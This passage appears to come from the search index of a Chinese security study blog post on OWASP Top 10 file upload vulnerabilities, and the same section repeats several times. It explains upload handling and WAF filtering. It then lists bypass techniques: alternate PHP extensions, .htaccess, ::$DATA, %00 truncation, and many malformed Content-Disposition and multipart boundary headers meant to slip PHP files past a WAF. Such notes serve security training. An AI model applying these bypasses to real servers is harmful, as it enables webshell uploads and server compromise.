filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#1文件上传原理"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#2漏洞原理"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#3攻击特征"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#4需满足条件"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#5数据包中可修改的地方"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 